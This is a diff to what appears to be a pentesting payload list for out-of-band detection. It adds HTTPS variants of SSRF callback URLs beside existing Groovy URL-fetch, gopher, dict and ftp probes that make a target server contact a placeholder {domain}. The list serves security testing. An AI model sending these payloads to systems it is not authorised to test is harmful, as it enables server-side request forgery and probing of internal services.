@@ -161,11 +161,15 @@ new java.net.URL('http://{domain}/groovy2').openStream()
 ##SSRF - OOB##
 https://{domain}/ssrf
 http://{domain}:8080/ssrf
+https://{domain}:8443/ssrf
 http://{domain}:443/ssrf
+https://{domain}:443/ssrf
 //{domain}/ssrf
 \\{domain}\ssrf
 http://{domain}%23@127.0.0.1
+https://{domain}%23@127.0.0.1
 http://foo.{domain}/ssrf
+https://foo.{domain}/ssrf
 gopher://{domain}:70/_test
 ftp://{domain}/ssrf
 dict://{domain}:11211/INFO
